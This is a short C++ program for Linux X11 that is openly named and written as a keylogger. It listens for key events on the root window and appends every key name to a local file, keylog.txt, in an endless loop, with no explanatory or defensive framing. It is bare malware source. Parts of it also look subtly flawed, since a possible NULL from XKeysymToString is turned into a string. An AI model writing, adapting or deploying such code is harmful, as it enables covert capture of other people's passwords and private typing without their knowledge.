#include <X11/Xlib.h>  // Include X11 library for keyboard events
#include <X11/XKBlib.h>
#include <iostream>
#include <fstream>

void KeyLogger() {
    Display *display = XOpenDisplay(NULL);  // Open a connection to the X server
    if (display == NULL) {
        std::cerr << "Unable to open X display" << std::endl;
        return;
    }

    Window root = DefaultRootWindow(display);  // Get the root window
    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);  // Select the events to listen for

    XEvent event;
    std::ofstream outFile;
    outFile.open("keylog.txt", std::ios::app);  // Open keylog.txt in append mode

    while (true) {
        XNextEvent(display, &event);  // Wait for the next event
        if (event.type == KeyPress || event.type == KeyRelease) {
            KeySym key = XKeycodeToKeysym(display, event.xkey.keycode, 0);  // Get the keysym
            std::string keyStr = XKeysymToString(key);  // Convert keysym to string
            if (!keyStr.empty()) {
                outFile << keyStr;  // Write the key to the file
            }
        }
    }

    XCloseDisplay(display);  // Close the connection to the X server
    outFile.close();  // Close the file
}

int main() {
    KeyLogger();  // Call the KeyLogger function
    return 0;
}
